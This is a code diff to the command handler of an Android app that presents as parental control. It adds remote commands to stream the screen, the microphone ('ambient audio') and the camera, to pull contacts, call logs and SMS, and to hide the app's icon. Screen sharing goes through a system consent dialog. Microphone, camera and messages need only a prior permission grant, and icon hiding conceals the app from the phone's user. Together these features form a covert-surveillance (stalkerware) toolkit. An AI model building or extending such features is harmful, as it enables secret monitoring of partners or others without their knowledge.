@@ -8,10 +8,15 @@ import org.setbd.control.BuildConfig
 import org.setbd.control.controls.BlockActivity
 import org.setbd.control.controls.PolicyEngine
 import org.setbd.control.devicemanagement.DevicePolicy
+import org.setbd.control.monitoring.CommunicationsProvider
 import org.setbd.control.monitoring.DeviceInfoProvider
 import org.setbd.control.monitoring.InstalledAppsProvider
 import org.setbd.control.monitoring.LocationProvider
 import org.setbd.control.monitoring.UsageStatsProvider
+import org.setbd.control.ui.IconHider
+import org.setbd.control.webrtc.CaptureService
+import org.setbd.control.webrtc.RtcStarter
+import org.setbd.control.webrtc.WebRtcCore
 import org.setbd.control.notifications.NotificationHelper
 import org.setbd.control.permissions.PermissionManager
 import org.setbd.control.storage.SecureStore
@@ -37,7 +42,20 @@ object CommandProcessor {
         "sync_policies",
         "lock_screen",
         "send_notification",
-        "trigger_sync"
+        "trigger_sync",
+        // WebRTC remote access (screen mirror / ambient audio / camera)
+        "start_screen_mirror",
+        "stop_screen_mirror",
+        "start_ambient_audio",
+        "stop_ambient_audio",
+        "start_remote_camera",
+        "stop_remote_camera",
+        // Optional communications monitoring (permission-gated)
+        "get_contacts",
+        "get_call_logs",
+        "get_sms",
+        // Device management
+        "set_icon_hidden"
     )
 
     sealed class Result {
@@ -128,8 +146,84 @@ object CommandProcessor {
                     Result.Ok(JSONObject().put("scheduled", true))
                 }
 
+                // ---- WebRTC remote access ----
+
+                "start_screen_mirror" -> {
+                    // Screen sharing always requires the system MediaProjection
+                    // consent dialog on the child device — never silent.
+                    Result.Ok(RtcStarter.requestScreen(ctx))
+                }
+
+                "stop_screen_mirror" -> {
+                    CaptureService.stopAll(ctx)
+                    Result.Ok(JSONObject().put("stopped", true))
+                }
+
+                "start_ambient_audio" -> {
+                    if (!PermissionManager.micGranted(ctx)) {
+                        Result.Failed("missing_permission", "Microphone permission is not granted on the child device")
+                    } else {
+                        Result.Ok(RtcStarter.requestAmbient(ctx))
+                    }
+                }
+
+                "stop_ambient_audio" -> {
+                    CaptureService.stopAll(ctx)
+                    Result.Ok(JSONObject().put("stopped", true))
+                }
+
+                "start_remote_camera" -> {
+                    if (!PermissionManager.cameraGranted(ctx)) {
+                        Result.Failed("missing_permission", "Camera permission is not granted on the child device")
+                    } else {
+                        val facing = if (payload.optString("facing", "front") == "back") "back" else "front"
+                        Result.Ok(RtcStarter.requestCamera(ctx, facing))
+                    }
+                }
+
+                "stop_remote_camera" -> {
+                    CaptureService.stopAll(ctx)
+                    Result.Ok(JSONObject().put("stopped", true))
+                }
+
+                // ---- Optional communications monitoring ----
+
+                "get_contacts" -> {
+                    if (!PermissionManager.contactsGranted(ctx)) {
+                        Result.Failed("missing_permission", "Contacts permission is not granted on the child device")
+                    } else {
+                        Result.Ok(CommunicationsProvider.contactsJson(ctx))
+                    }
+                }
+
+                "get_call_logs" -> {
+                    if (!PermissionManager.phoneGranted(ctx)) {
+                        Result.Failed("missing_permission", "Phone/Call Log permission is not granted on the child device")
+                    } else {
+                        Result.Ok(CommunicationsProvider.callLogsJson(ctx))
+                    }
+                }
+
+                "get_sms" -> {
+                    if (!PermissionManager.smsGranted(ctx)) {
+                        Result.Failed("missing_permission", "SMS permission is not granted on the child device")
+                    } else {
+                        Result.Ok(CommunicationsProvider.smsJson(ctx))
+                    }
+                }
+
+                // ---- Device management ----
+
+                "set_icon_hidden" -> {
+                    val hidden = payload.optBoolean("hidden", !IconHider.isHidden(ctx))
+                    IconHider.setHidden(ctx, hidden)
+                    Result.Ok(JSONObject().put("hidden", IconHider.isHidden(ctx)))
+                }
+
                 else -> Result.Failed("unknown_action", "Action \"$action\" is not allowed")
             }
+        } catch (e: SecurityException) {
+            Result.Failed("missing_permission", e.message ?: "Permission denied")
         } catch (e: Exception) {
             Result.Failed("error", e.message ?: "Command failed")
         }
